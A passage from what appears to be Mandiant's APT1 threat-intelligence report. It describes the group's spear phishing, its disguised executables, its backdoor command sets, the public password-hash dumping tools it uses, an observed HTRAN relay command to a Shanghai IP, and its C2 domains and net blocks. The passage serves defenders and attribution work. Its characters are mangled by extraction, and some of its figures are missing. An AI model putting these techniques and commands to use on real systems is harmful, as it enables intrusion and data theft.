accessed the email accounts of several executives, including the CEO and General Counsel. During this same time period, major news organizations reported that China had successfully negotiated a double-digit decrease in price per unit with the victim organization for one of its major commodities. This may be coincidental; however, it would be surprising if APT1 could continue perpetrating such a broad mandate of cyber espionage and data theft if the results of the group™s efforts were not ˜nding their way into the hands of entities able to capitalize on them. Mandiant APT1 26 www.mandiant.com APT1 In The NewsPublic reporting corroborates and extends our observations of APT1™s cyber espionage activity. However, several factors complicate the process of compiling and synthesizing public reports on APT1. For one thing, information security researchers and journalists refer to APT1 by a variety of names. In addition, many cyber security analysts focus on writing about tools that are shared between multiple Chinese APT groups without differentiating between the various actors that use them.To assist researchers in identifying which public reports describe the threat group that we identify as APT1, Table 3 provides a list of APT group nicknames that frequently appear in the media and differentiates between those that describe APT1 and those that do not. In addition, below is a list of public reports about Chinese threat actors that we have con˜rmed as referring to APT1.»The earliest known public report about APT1 infrastructure is a 2006 publication from the Japanese division of Symantec.30 The report calls out the hostname sb.hugesoft.org, which is registered to an APT1 persona known as Ugly Gorilla (discussed later in this report).»In September 2012, Brian Krebs of the ﬁKrebs on Securityﬂ cybercrime blog reported on a security breach at Telvent Canada Ltd (now Schneider Electric), which we attributed to APT1 based on the tools and infrastructure that the hackers used to exploit and gain access to the system.31TABLE 3: Identifying APT1 Nicknames in the NewsNicknameVerdict Comment CrewCon˜rmed APT1Comment GroupCon˜rmed APT1Shady RatPossibly APT1 (not con˜rmed)Nitro AttacksNot APT1; Attributed to another tracked APT groupElderwoodNot APT1; Attributed to another tracked APT groupSykipotNot APT1; Attributed to another tracked APT groupAuroraNot APT1; Attributed to another tracked APT groupNight DragonNot APT1; Attributed to another tracked APT group»A SCADA security company by the name of Digital Bond published a report of spear phishing against its company in June 2012.32 AlienVault provided analysis on the associated malware. 33 Indicators included in the report have been attributed as part of APT1 infrastructure.»In November 2012, Bloomberg™s Chloe Whiteaker authored a piece on a Chinese threat group called ﬁComment Group,ﬂ which described the various tools and domains used by APT1 persona Ugly Gorilla.3430 Symantec, ﬁBackdoor.Wualess,ﬂ Symantec Security Response (2007), http://www.symantec.com/ja/jp/security_response/print_writeup. jsp?docid=2006-101116-1723-99, accessed February 3, 2013.31 Brian Krebs, ﬁChinese Hackers Blamed for Intrusion at Energy Industry Giant Telvent,ﬂ Krebs on Security (2012) http://krebsonsecurity. com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/, accessed February 3, 2013 32 Reid Wightman, ﬁSpear Phishing Attempt,ﬂ Digital Bond (2012), https://www.digitalbond.com/blog/2012/06/07/spear-phishing-attempt/, accessed February 3, 2013.33 Jaime Blasco, ﬁUnveiling a spearphishing campaign and possible rami˜cations,ﬂ Alien Vault (2012), http://labs.alienvault.com/labs/index.php/2012/unveiling-a-spearphishing-campaign-and-possible-rami˜cations/, accessed February 3, 2013.34 Chloe Whiteaker, ﬁFollowing the Hackers™ Trail,ﬂ Bloomberg, (2012) http://go.bloomberg.com/multimedia/following-hackers-trail/, accessed February 3, 2013. Mandiant APT1 27 www.mandiant.com APT1: ATTA CK LIFECYCLEAPT1 has a well-de˜ned attack methodology, honed over years and designed to steal massive quantities of intellectual property. They begin with aggressive spear phishing, proceed to deploy custom digital weapons, and end by exporting compressed bundles of ˜les to China Œ before beginning the cycle again. They employ good English Š with acceptable slang Š in their socially engineered emails. They have evolved their digital weapons for more than seven years, resulting in continual upgrades as part of their own software release cycle. Their ability to adapt to their environment and spread across systems makes them effective in enterprise environments with trust relationships. These attacks ˜t into a cyclic pattern of activity that we will describe in this section within the framework of Mandiant™s Attack Lifecycle model. In each stage we will discuss APT1™s speci˜c techniques to illustrate their tenacity and the scale at which they operate. (See Appendix B: ﬁAPT and the Attack Lifecycleﬂ for a high-level overview of the steps most APT groups take in each stage of the Attack Lifecycle.)InitialReconInitialCompromiseEstablishFootholdEscalatePrivilegesCompleteMissionInternalReconMoveLaterallyMaintainPresenceFIGURE 14: Mandiant™s Attack Lifecycle Model Mandiant APT1 28 www.mandiant.com The Initial CompromiseThe Initial Compromise represents the methods intruders use to ˜rst penetrate a target organization™s network. As with most other APT groups, spear phishing is APT1™s most commonly used technique. The spear phishing emails contain either a malicious attachment or a hyperlink to a malicious ˜le. The subject line and the text in the email body are usually relevant to the recipient. APT1 also creates webmail accounts using real peoples™ names Š names that are familiar to the recipient, such as a colleague, a company executive, an IT department employee, or company counsel Š and uses these accounts to send the emails. As a real-world example, this is an email that APT1 sent to Mandiant employees:Date: Wed, 18 Apr 2012 06:31:41 -0700 From: Kevin Mandia <kevin.mandia@rocketmail.com> Subject: Internal Discussion on the Press ReleaseHello,Shall we schedule a time to meet next week? Details click here.Kevin MandiaFIGURE 15: APT1 Spear Phishing Email At ˜rst glance, the email appeared to be from Mandiant™s CEO, Kevin Mandia. However, further scrutiny shows that the email was not sent from a Mandiant email account, but from ﬁkevin.mandia@rocketmail.comﬂ. Rocketmail is a free webmail service. The account ﬁkevin.mandia@rocketmail.comﬂ does not belong to Mr. Mandia. Rather, an APT1 actor likely signed up for the account speci˜cally for this spear phishing event. If anyone had clicked on the link that day (which no one did, thankfully), their computer would have downloaded a malicious ZIP ˜le named ﬁInternal_ Discussion_Press_Release_In_Next_Week8.zipﬂ. This ˜le contained a malicious executable that installs a custom APT1 backdoor that we call WEBC2-TABLE. Mandiant APT1 29 www.mandiant.com Although the ˜les that APT1 actors attach or link to spear phishing emails are not always in ZIP format, this is the predominant trend we have observed in the last several years. Below is a sampling of ˜le names that APT1 has used with their malicious ZIP ˜les: Spear Phishing Emailwith Attachment@What™s this email?Is this for real?@@!ﬁIt™s legit.ﬂOkay, thanks!APT 1APT 1APT 1The example ˜le names include military, economic, and diplomatic themes, suggesting the wide range of industries that APT1 targets. Some names are also generic (e.g., ﬁupdated_of˜ce_contact_v1.zipﬂ) and could be used for targets in any industry. On some occasions, unsuspecting email recipients have replied to the spear phishing messages, believing they were communicating with their acquaintances. In one case a person replied, ﬁI™m not sure if this is legit, so I didn™t open it.ﬂ Within 20 minutes, someone in APT1 responded with a terse email back: ﬁIt™s legit.ﬂ FIGURE 16: APT1™s interaction with a spear phishing recipient Mandiant APT1 30 www.mandiant.com Would you click on this?Some APT1 actors have gone to the trouble of making the malicious software inside their ZIP ˜les look like benign Adobe PDF ˜les. Here is an example:This is not a PDF ˜le. It looks like the ˜lename has a PDF extension but the ˜le name actually includes 119 spaces after ﬁ.pdfﬂ followed by ﬁ.exeﬂ Š the real ˜le extension. APT1 even went to the trouble of turning the executable™s icon to an Adobe symbol to complete the ruse. However, this ˜le is actually a dropper for a custom APT1 backdoor that we call WEBC2-QBP. Establishing A FootholdEstablishing a foothold involves actions that ensure control of the target network™s systems from outside the network. APT1 establishes a foothold once email recipients open a malicious ˜le and a backdoor is subsequently installed. A backdoor is software that allows an intruder to send commands to the system remotely. In almost every case, APT backdoors initiate outbound connections to the intruder™s ﬁcommand and controlﬂ (C2) server. APT intruders employ this tactic because while network ˜rewalls are generally adept at keeping malware outside the network from initiating communication with systems inside the network, they are less reliable at keeping malware that is already inside the network from communicating to systems outside. 1001100100011010100 10010100101110001100100011010100 C2FIGURE 17: Backdoors installed on compromised systems usually initiate connections with C2 serversWhile APT1 intruders occasionally use publicly available backdoors such as Poison Ivy and Gh0st RAT, the vast majority of the time they use what appear to be their own custom backdoors. We have documented 42 families of backdoors in ﬁAppendix C: The Malware Arsenalﬂ that APT1 uses that we believe are not publicly available. In addition we have provided 1,007 MD5 hashes associated with APT1 malware in Appendix E. We will describe APT1™s backdoors in two categories: ﬁBeachhead Backdoorsﬂ and ﬁStandard Backdoors.ﬂ Mandiant APT1 31 www.mandiant.com Beachhead BackdoorsBeachhead backdoors are typically minimally featured. They offer the attacker a toe-hold to perform simple tasks like retrieve ˜les, gather basic system information and trigger the execution of other more signi˜cant capabilities such as a standard backdoor. APT1™s beachhead backdoors are usually what we call WEBC2 backdoors. WEBC2 backdoors are probably the most well-known kind of APT1 backdoor, and are the reason why some security companies refer to APT1 as the ﬁComment Crew.ﬂ A WEBC2 backdoor is designed to retrieve a webpage from a C2 server. It expects the webpage to contain special HTML tags; the backdoor will attempt to interpret the data between the tags as commands. Older versions of WEBC2 read data between HTML comments, though over time WEBC2 variants have evolved to read data contained within other types of tags. From direct observation, we can con˜rm that APT1 was using WEBC2 backdoors as early as July 2006. However, the ˜rst compile time 35 we have for WEBC2-KT3 is 2004-01-23, suggesting that APT1 has been crafting WEBC2 backdoors since early 2004. Based on the 400+ samples of WEBC2 variants that we have accumulated, it appears that APT1 has direct access to developers who have continually released new WEBC2 variants for over six years. For example, these two build paths, which were discovered inside WEBC2-TABLE samples, help to illustrate how APT1 has been steadily building new WEBC2 variants as part of a continuous development process:Sample ACompile date: 2012-02-23 winApplication2009-8-7\\\\mywork\\\\ aaaaaaa2012-2-23\\\\Release\\\\aaaaaaa.pdbSample BMD5: c1393e77773a48b1eea117a302138554 Compile date: 2009-08-07 winApplication2009-8-7\\\\mywork\\\\aaaaaaa\\\\Release\\\\ aaaaaaa.pdb 35 ﬁCompileﬂ refers to the process of transforming a programmer™s source code into a ˜le that a computer can understand and execute.

To help illustrate this, consider the following example from the physical world. There is now a vast array of computing tablets for sale. These include Apple™s iPad, Samsung™s Galaxy Tab, and Microsoft™s Surface. Although these are all tablet computers, ﬁunder the hoodﬂ they are probably quite different. However, one can expect that an iPad 1 and an iPad 2 share a signi˜cant number of components Š much more than, say, an iPad 1 and a Microsoft Surface. Thus it makes sense to refer to the iPad ﬁfamilyﬂ and the Surface ﬁfamilyﬂ. When it comes to computer programs, in general if they share more than 80% of the same code we consider them part of the same family. There are exceptions: for example, some ˜les contain public and standard code libraries that we do not take into consideration when making a family determination. Mandiant APT1 32 www.mandiant.com A ﬁbuild pathﬂ discloses the directory from which the programmer built and compiled his source code. These samples, compiled 2.5 years apart, were compiled within a folder named ﬁwork\\\\code\\\\...\\\\ myworkﬂ. The instances of ﬁworkﬂ suggest that working on WEBC2 is someone™s day job and not a side project or hobby. Furthermore, the Sample A build string includes ﬁ2012-2-23ﬂ Š which matches Sample A™s compile date. The Sample B build string lacks ﬁ2012-2-23ﬂ but includes ﬁ2009-8-7ﬂ Š which also matches Sample B™s compile date. This suggests that the code used to compile Sample A was modi˜ed from code that was used to compile Sample B 2.5 years previously. The existence of ﬁ2008-7-8ﬂ suggests that the code for both samples was modi˜ed from a version that existed in July 2008, a year before Sample B was created. This series of dates indicates that developing and modifying the WEBC2 backdoor is an iterative and long-term process.WEBC2 backdoors typically give APT1 attackers a short and rudimentary set of commands to issue to victim systems, including:»Open an interactive command shell (usually Windows™ cmd.exe)»Download and execute a ˜le»Sleep (i.e. remain inactive) for a speci˜ed amount of timeWEBC2 backdoors are often packaged with spear phishing emails. Once installed, APT1 intruders have the option to tell victim systems to download and execute additional malicious software of their choice. WEBC2 backdoors work for their intended purpose, but they generally have fewer features than the ﬁStandard Backdoorsﬂ described below. Standard BackdoorsThe standard, non-WEBC2 APT1 backdoor typically communicates using the HTTP protocol (to blend in with legitimate web traf˜c) or a custom protocol that the malware authors designed themselves. These backdoors give APT intruders a laundry list of ways to control victim systems, including:»Create/modify/delete/execute programs»Upload/download ˜les»Create/delete directories»List/start/stop processes»Modify the system registry »Take screenshots of the user™s desktop »Capture keystrokes»Capture mouse movement»Start an interactive command shell»Create a Remote desktop (i.e. graphical) interface»Harvest passwords»Enumerate users»Enumerate other systems on the network»Sleep (i.e. go inactive) for a speci˜ed amount of time»Log off the current user»Shut down the systemSEASALTLONGRUNWEBC2.TOCKWEBC2.YAHOOWARPTABMSGSQLWEBC2.CSONWEBC2.QBPCOMBOSWEBC2.DIVCOOKIEBAGGLOOXMAILMINIASPBOUNCERWEBC2.TABLEWEBC2.BOLIDKURTONCALENDARGDOCUPLOADLIGHTBOLTWEBC2.Y21KWEBC2.KT32004LIGHTDART20052006MAPIGETBISCUITMANITSMEWEBC2.UGXSTARSYPOUNDTARSIPDAIRYSWORDHELAUTOWEBC2.AUSOVHACKSFASEAURIGAWEBC2.CLOVERGREENCATMACROMAILGOGGLESNEWSREELSWEBC2.RAVEWEBC2.ADSPACEWEBC2.HEADBANGAT200720082009201020112012APT 1 MALWARE FAMILIESGETMAILFIRST KNOWN COMPILE TIMES Mandiant APT1 33 www.mandiant.com The BISCUIT backdoor (so named for the command ﬁbdkztﬂ) is an illustrative example of the range of commands that APT1 has built into its ﬁstandardﬂ backdoors. APT1 has used and steadily modi˜ed BISCUIT since as early as 2007 and continues to use it presently. TABLE 4: A subset of BISCUIT commandsCommandDescriptionLaunch a command shellGet system informationdownload Transfer a ˜le from the C2 server exe Launch a program as a speci˜c userexitClose the connection and sleeplists <type>List servers on a Windows network. ljcEnumerate running processes and identify their owners.sjc Terminate a process, either by process ID or by process name. upload Send a ˜le to the C2 server<input>Send input to the command shell process (launched with ﬁbdkztﬂ).These functions are characteristic of most backdoors, and are not limited to APT1 or even APT. For example, anyone who wants to control a system remotely will likely put functions like ﬁUpload/download ˜lesﬂ into a backdoor. Covert CommunicationsSome APT backdoors attempt to mimic legitimate Internet traf˜c other than the HTTP protocol. APT1 has created a handful of these, including:TABLE 5: Backdoors that mimic legitimate communication protocolsBackdoor Mimicked protocolMACROMAIL MSN MessengerGLOOXMAIL Jabber/XMPPCALENDAR Gmail CalendarWhen network defenders see the communications between these backdoors and their C2 servers, they might easily dismiss them as legitimate network traf˜c. Additionally, many of APT1™s backdoors use SSL encryption so that communications are hidden in an encrypted SSL tunnel. We have provided APT1™s public SSL certi˜cates in Appendix F so people can incorporate them into their network signatures. Mandiant APT1 34 www.mandiant.com Privilege EscalationEscalating privileges involves acquiring items (most often usernames and passwords) that will allow access to more resources within the network. In this and the next two stages, APT1 does not differ signi˜cantly from other APT intruders (or intruders, generally). APT1 predominantly uses publicly available tools to dump password hashes from victim systems in order to obtain legitimate user credentials.APT1 has used these privilege escalation tools:TABLE 6: Publicly available privilege escalation tools that APT1 has usedTool Description Websitecachedump This program extracts cached password hashes from a system™s registry Currently packaged with fgdump (below)fgdump Windows password hash dumper http://www.foofus.net/˜zzgig/fgdump/ gsecdump Obtains password hashes from the Windows registry, including the SAM ˜le, cached domain credentials, and LSA secrets http://www.truesec.se lslsass Dump active logon session password hashes from the lsass process http://www.truesec.se mimikatz A utility primarily used for dumping password hashes http://blog.gentilkiwi.com/mimikatzpass-the-hash toolkit Allows an intruder to ﬁpassﬂ a password hash (without knowing the original password) to log in to systems http://oss.coresecurity.com/projects/pshtoolkit.htm pwdump7 Dumps password hashes from the Windows registry http://www.tarasco.org/security/pwdump_7/ pwdumpX Dumps password hashes from the Windows registry The tool claims its origin as http://reedarvin.thearvins.com/, but the site is not offering this software as of the date of this report Mandiant APT1 35 www.mandiant.com Internal ReconnaissanceIn the Internal Reconnaissance stage, the intruder collects information about the victim environment. Like most APT (and non-APT) intruders, APT1 primarily uses built-in operating system commands to explore a compromised system and its networked environment. Although they usually simply type these commands into a command shell, sometimes intruders may use batch scripts to speed up the process. Figure 18 below shows the contents of a batch script that APT1 used on at least four victim networks. FIGURE 18: An APT1 batch script that automates reconnaissanceWhat is a password hash?When a person logs in to a computer, website, email server, or any networked resource requiring a password, the supplied password needs to be veri˜ed. One way to do this would be to store the person™s actual password on the system that the person is trying to access, and to compare the typed password to the stored password. Although simple, this method is also very insecure: anyone who can access that same system will be able to see the person™s password. Instead, systems that verify passwords usually store password hashes. In simple terms, a password hash is a number that is mathematically generated from the person™s password. The mathematical methods (algorithms) used to generate password hashes will create values that are unique for all practical purposes. When a person supplies their password, the computer generates a hash of the typed password and compares it to the stored hash. If they match, the passwords are presumed to be the same and the person is allowed to log in.It is supposed to be impossible to ﬁreverseﬂ a hash to obtain the original password. However, it is possible with enough computational resources to ﬁcrackﬂ password hashes to discover the original password. (ﬁCrackingﬂ generally consists of guessing a large number of passwords, hashing them, and comparing the generated hashes to the existing hashes to see if any match.) Intruders will steal password hashes from victim systems in hopes that they can either use the hashes as-is (by ﬁpassing-the-hashﬂ) or crack them to discover users™ passwords. Mandiant APT1 36 www.mandiant.com This script performs the following functions and saves the results to a text ˜le:»Display the victim™s network con˜guration information »List the services that have started on the victim system»List currently running processes»List accounts on the system»List accounts with administrator privileges»List current network connections»List currently connected network shares»List other systems on the network»List network computers and accounts according to group (ﬁdomain controllers,ﬂ ﬁdomain users,ﬂ ﬁdomain admins,ﬂ etc.)Lateral MovementOnce an APT intruder has a foothold inside the network and a set of legitimate credentials,36 it is simple for the intruder to move around the network undetected:»They can connect to shared resources on other systems»They can execute commands on other systems using the publicly available ﬁpsexecﬂ tool from Microsoft Sysinternals or the built-in Windows Task Scheduler (ﬁat.exeﬂ) These actions are hard to detect because legitimate system administrators also use these techniques to perform actions around the network.Maintain PresenceIn this stage, the intruder takes actions to ensure continued, long-term control over key systems in the network environment from outside of the network. APT1 does this in three ways.1. Install new backdoors on multiple systemsThroughout their stay in the network (which could be years), APT1 usually installs new backdoors as they claim more systems in the environment. Then, if one backdoor is discovered and deleted, they still have other backdoors they can use. We usually detect multiple families of APT1 backdoors scattered around a victim network when APT1 has been present for more than a few weeks.2. Use legitimate VPN credentialsAPT actors and hackers in general are always looking for valid credentials in order to impersonate a legitimate user. We have observed APT1 using stolen usernames and passwords to log into victim networks™ VPNs when the VPNs are only protected by single-factor authentication. From there they are able to access whatever the impersonated users are allowed to access within the network.36 Mandiant uses the term ﬁcredentialsﬂ to refer to a userid and its corresponding, working password. Mandiant APT1 37 www.mandiant.com 3. Log in to web portalsOnce armed with stolen credentials, APT1 intruders also attempt to log into web portals that the network offers. This includes not only restricted websites, but also web-based email systems such as Outlook Web Access. Completing The MissionSimilar to other APT groups we track, once APT1 ˜nds ˜les of interest they pack them into archive ˜les before stealing them. APT intruders most commonly use the RAR archiving utility for this task and ensure that the archives are password protected. Sometimes APT1 intruders use batch scripts to assist them in the process, as depicted in Figure 19. (The instances of ﬁXXXXXXXXﬂ obfuscate the text that was in the actual batch script.) del *.vbs del %0FIGURE 19: An APT1 batch script that bundles stolen ˜les into RAR archive ˜lesAfter creating ˜les compressed via RAR, the APT1 attackers will transfer ˜les out of the network in ways that are consistent with other APT groups, including using the File Transfer Protocol (FTP) or their existing backdoors. Many times their RAR ˜les are so large that the attacker splits them into chunks before transferring them. Figure 19 above shows a RAR command with the option ﬁ-v200mﬂ, which means that the RAR ˜le should be split up into 200MB portions..rarFIGURE 20: APT1 bundles stolen ˜les into RAR archives before moving data to China Mandiant APT1 38 www.mandiant.com Unlike most other APT groups we track, APT1 uses two email-stealing utilities that we believe are unique to APT1. The ˜rst, GETMAIL, was designed speci˜cally to extract email messages, attachments, and folders from within Microsoft Outlook archive (ﬁPSTﬂ) ˜les. Microsoft Outlook archives can be large, often storing years™ worth of emails. They may be too large to transfer out of a network quickly, and the intruder may not be concerned about stealing every email. The GETMAIL utility allows APT1 intruders the ˛exibility to take only the emails between dates of their choice. In one case, we observed an APT1 intruder return to a compromised system once a week for four weeks in a row to steal only the past week™s emails. Whereas GETMAIL steals email in Outlook archive ˜les, the second utility, MAPIGET, was designed speci˜cally to steal email that has not yet been archived and still resides on a Microsoft Exchange Server. In order to operate successfully, MAPIGET requires username/password combinations that the Exchange server will accept. MAPIGET extracts email from speci˜ed accounts into text ˜les (for the email body) and separate attachments, if there are any. English As A Second LanguageAPT1™s ﬁIt™s legitﬂ email should not mislead someone into thinking that APT1 personnel are all ˛uent in English, though some undoubtedly are. Their own digital weapons betray the fact that they were programmed by people whose ˜rst language is not English. Here are some examples of grammatically incorrect phrases that have made it into APT1™s tools over the years.TABLE 7: Examples of grammatically incorrect phrases in APT1 malwarePhrase Tool Compile dateIf use it, key is the KEY.

We have evidence suggesting that APT1 manually controls thousands of systems in support of their attacks, and have directly observed their control over hundreds of these systems. Although they control systems in dozens of countries, their attacks originate from four large networks in Shanghai Š two of which are allocated directly to the Pudong New Area, the home of Unit 61398. The sheer number of APT1 IP addresses concentrated in these Shanghai ranges, coupled with Simpli˜ed Chinese keyboard layout settings on APT1™s attack systems, betrays the true location and language of the operators. To help manage the vast number of systems they control, APT1 has registered hundreds of domain names, the majority of which also point to a Shanghai locale. The domain names and IP addresses together comprise APT1™s command and control framework which they manage in concert to camou˛age their true origin from their English speaking targets.APT1 Network OriginsWe are frequently asked why it is an ineffective security measure to just block all IP addresses in China from connecting to your network. To put it simply, it is easy for APT1 attackers to bounce or ﬁhopﬂ through intermediary systems such that they almost never connect to a victim network directly from their systems in Shanghai. Using their immense infrastructure, they are able to make it appear to victims that an attack originates from almost any country they choose. The systems in this type of network redirection infrastructure have come to be called ﬁhop pointsﬂ or ﬁhops.ﬂ Hop points are most frequently compromised systems that APT1 uses, in some instances for years, as camou˛age for their attacks without the knowledge of the systems™ owners. These systems belong to third-party victims who are compromised for access to infrastructure, as opposed to direct victims who are compromised for their data and intellectual property. FIGURE 21: APT1 bounces through ﬁhop pointﬂ systems before accessing victim systems Mandiant APT1 40 www.mandiant.com We have observed some of APT1™s activities after they cross into (virtual) U.S. territory. They access hop points using a variety of techniques, the most popular being Remote Desktop and FTP. Over a two-year period (January 2011 to January 2013) we con˜rmed 1,905 instances of APT1 actors logging into their hop infrastructure from 832 different IP addresses with Remote Desktop. Remote Desktop provides a remote user with an interactive graphical interface to a system. The experience is similar to the user actually physically sitting at the system and having direct access to the desktop, keyboard, and mouse. Of the 832 IP addresses, 817 (98.2%) were Chinese and belong predominantly to four large net blocks in Shanghai which we will refer to as APT1™s home networks.TABLE 8: Net blocks corresponding to IP addresses that APT1 used to access their hop pointsNumber Net block Registered Owner 445 223.166.0.0 - 223.167.255.255 China Unicom Shanghai Network 217 58.246.0.0 - 58.247.255.255 China Unicom Shanghai Network 114 112.64.0.0 - 112.65.255.255 China Unicom Shanghai Network 12 139.226.0.0 - 139.227.255.255 China Unicom Shanghai Network 1 114.80.0.0 - 114.95.255.255 China Telecom Shanghai Network 1 101.80.0.0 - 101.95.255.255 China Telecom Shanghai Network 27 Other (non-Shanghai) Chinese IPs Notably, the registration information for the second and third net blocks above includes this contact information at the end:e-mail: sh-ipmaster@chinaunicom.cnphone: +086-021-61201616country: cnThe registration information for these two net blocks suggests that they serve the Pudong New Area of Shanghai, where PLA Unit 61398 is headquartered. The other 15 of the 832 IP addresses are registered to organizations in the U.S. (12), Taiwan (1), Japan (1) and Korea (1). We have con˜rmed that some of these systems are part of APT1™s hop infrastructure and not legitimately owned by APT1 Š in other words, APT1 accessed one hop from another hop, as opposed to accessing the hop directly from Shanghai.In order to make a user™s experience as seamless as possible, the Remote Desktop protocol requires client applications to forward several important details to the server, including their client hostname and the client keyboard layout. In 1,849 of the 1,905 (97%) APT1 Remote Desktop sessions we observed in the past two years, the keyboard layout setting was ﬁChinese (Simpli˜ed) Š US Keyboard.ﬂ Microsoft™s Remote Desktop client con˜gures this setting automatically based on the selected language on the client system, making it nearly certain that the APT1 actors managing the hop infrastructure are doing so with Simpli˜ed Chinese (zh-cn) input settings. ﬁSimpli˜ed Chineseﬂ is a streamlined set of the traditional Chinese characters that have been in use since the 1950s, originating in mainland China. Taiwan and municipalities such as Hong Kong still use ﬁTraditional Chineseﬂ (zh-tw) character sets. The overwhelming concentration of Shanghai IP addresses and Simpli˜ed Chinese language settings clearly indicate that APT1 intruders are mainland Chinese speakers with ready access to large networks in Shanghai. The only Mandiant APT1 41 www.mandiant.com alternative is that APT1 has intentionally been conducting a years-long deception campaign to impersonate Chinese speakers from Shanghai in places where victims are not reasonably expected to have any visibility Œ and without making a single mistake that might indicate their ﬁtrueﬂ identity. Interaction with BackdoorsAs we just mentioned, APT1 attackers typically use hops to connect to and control victim systems. Victim backdoors regularly connect out to hop points, waiting for the moment that the attacker is there to give them commands. However, exactly how this works is often speci˜c to the tools they are using. MANUAL WEBC2 UPDATES As covered in the previous ﬁAttack Lifecycleﬂ section, WEBC2 backdoor variants download and interpret data stored between tags in HTML pages as commands. They usually download HTML pages from a system within APT1™s hop infrastructure. We have observed APT1 intruders logging in to WEBC2 servers and manually editing the HTML pages that backdoors will download. Because the commands are usually encoded and dif˜cult to spell from memory, APT1 intruders typically do not type these strings, but instead copy and paste them into the HTML ˜les. They likely generate the encoded commands on their own systems before pasting them in to an HTML ˜le hosted by the hop point. For example, we observed an APT attacker pasting the string ﬁczo1NA==ﬂ into an HTML page. That string is the base64- encoded version of ﬁs:54ﬂ, meaning ﬁsleep for 54 minutesﬂ (or hours, depending on the particular backdoor). In lieu of manually editing an HTML ˜le on a hop point, we have also observed APT1 intruders uploading new (already-edited) HTML ˜les. HTRANWhen APT1 attackers are not using WEBC2, they require a ﬁcommand and controlﬂ (C2) user interface so they can issue commands to the backdoor. This interface sometimes runs on their personal attack system, which is typically in Shanghai. In these instances, when a victim backdoor makes contact with a hop, the communications need to be forwarded from the hop to the intruder™s Shanghai system so the backdoor can talk to the C2 server software. We have observed 767 separate instances in which APT1 intruders used the publicly available ﬁHUC Packet Transmit Toolﬂ or HTRAN on a hop. As always, keep in mind that these uses are con˜rmed uses, and likely represent only a small fraction of APT1™s total activity. The HTRAN utility is merely a middle-man, facilitating connections between the victim and the attacker who is using the hop point.0100100001010010000101010100010101010001C2HTRANFIGURE 22: The HTRAN tool resides on APT1 hop points and acts as a middle-man Mandiant APT1 42 www.mandiant.com Typical use of HTRAN is fairly simple: the attacker must specify the originating IP address (of his or her workstation in Shanghai), and a port on which to accept connections. For example, the following command, which was issued by an APT1 actor, will listen for incoming connections on port 443 on the hop and automatically proxy them to the Shanghai IP address 58.247.242.254 on port 443:htran -tran 443 58.247.242.254 443In the 767 observed uses of HTRAN, APT1 intruders supplied 614 distinct routable IP addresses. In other words, they used their hops to function as middlemen between victim systems and 614 different addresses. Of these addresses, 613 of 614 are part of APT1™s home networks: TABLE 9: Net blocks corresponding to IP addresses used to receive HTRAN communications Number Net block Registered Owner340 223.166.0.0 - 223.167.255.255 China Unicom Shanghai Network 160 58.246.0.0 - 58.247.255.255 China Unicom Shanghai Network 102 112.64.0.0 - 112.65.255.255 China Unicom Shanghai Network 11 139.226.0.0 - 139.227.255.255 China Unicom Shanghai Network 1 143.89.0.0 - 143.89.255.255 Hong Kong University of Science and Technology C2 SERVER SOFTWARE ON HOP INFRASTRUCTUREOccasionally, APT1 attackers have installed C2 server components on systems in their hop infrastructure rather than forwarding connections back to C2 servers in Shanghai. In these instances they do not need to use a proxy tool like HTRAN to interact with victim systems. However, it does mean that the intruders need to be able to interface with the (often graphical) C2 server software running on the hop. We have observed APT1 intruders log in to their hop point, start the C2 server, wait for incoming connections, and then proceed to give commands to victim systems. WEBC2 variants may include a server component that provides a simple C2 interface to the intruder. This saves the intruder from having to manually edit webpages. That is, this server component receives connections from victim backdoors, displays them to the intruder, and then translates the intruder™s commands into HTML tags that the victim backdoors read. Mandiant APT1 43 www.mandiant.com APT1 ServersIn the last two years alone, we have con˜rmed 937 APT1 C2 servers Š that is, actively listening or communicating programs Š running on 849 distinct IP addresses. However, we have evidence to suggest that APT1 is running hundreds, and likely thousands, of other servers (see the Domains section below). The programs acting as APT1 servers have mainly been: (1) FTP, for transferring ˜les; (2) web, primarily for WEBC2; (3) RDP, for remote graphical control of a system; (4) HTRAN, for proxying; and (5) C2 servers associated with various backdoor families (covered in Appendix C: The Malware Arsenal).

In the same way that people program named contacts into their cell phones and no longer need to remember phone numbers, DNS allows people to remember names like ﬁgoogle.comﬂ instead of IP addresses. When a person types ﬁgoogle.comﬂ into a web browser, a DNS translation to an IP address occurs so that the person™s computer can communicate with Google. Names that can be translated through DNS to IP addresses are referred to as Fully Quali˜ed Domain Names (FQDNs).0100100001010010000101010100010101010001ug-co.hugesoft.org 10100100101001011001100100011010100 1001100100011 DNS QUERY ﬁHere™s the IP addressﬂC2FIGURE 24: DNS queries are used to resolve APT1 FQDNs to many C2 server IPs Mandiant APT1 45 www.mandiant.com APT1™s infrastructure includes FQDNs in addition to the IP addresses discussed above. The FQDNs play an important role in their intrusion campaigns because APT1 embeds FQDNs as C2 addresses within their backdoors. In the last several years we have con˜rmed 2,551 FQDNs attributed to APT1. Of these, we have redacted FQDNs that implicated victims by name and provided 2,046 in Appendix D. By using FQDNs rather than hard- coded IP addresses as C2 addresses, attackers may dynamically decide where to direct C2 connections from a given backdoor. That is, if they lose control of a speci˜c hop point (IP address) they can ﬁpointﬂ the C2 FQDN address to a different IP address and resume their control over victim backdoors. This ˛exibility allows the attacker to direct victim systems to myriad C2 servers and avoid being blocked.APT1 FQDNs can be grouped into three categories: (1) registered zones, (2) third-party zones, and (3) hijacked domains. REGISTERED ZONESA DNS zone represents a collection of FQDNs that end with the same name, and which are usually registered through a domain registration company and controlled by a single owner. For example, ﬁhugesoft.orgﬂ is an FQDN but also represents a zone. The FQDNs ﬁug-co.hugesoft.orgﬂ and ﬁ7cback.hugesoft.orgﬂ are part of the ﬁhugesoft. orgﬂ zone and are called ﬁsubdomainsﬂ of the zone. The person who registered ﬁhugesoft.orgﬂ may add as many subdomains as they wish and controls the IP resolutions of these FQDNs. APT1 has registered at least 107 zones since 2004. Within these zones, we know of thousands of FQDNs that have resolved to hundreds of IP addresses (which we suspect are hops) and in some instances to APT1™s source IP addresses in Shanghai.The ˜rst zone we became aware of was ﬁhugesoft.orgﬂ, which was registered through eNom, Inc. in October 2004. The registrant supplied ﬁuglygorilla@163.comﬂ as an email address. The supplied registration information, which is still visible in public ﬁwhoisﬂ data as of February 3, 2013, includes the following:APT1 Zone Registrationshugesoft.orgustvb.comuszzcs.comhvmetal.comhkcastte.comattnpower.comifexcel.combpyoyo.comskyswim.netcslisten.combigish.netchileexe77.comissnbgkit.netprogammerli.comidirectech.comlivemymsn.comwebservicesupdate.comgiftnews.orgonefastgame.netconferencesinfo.com5 zones 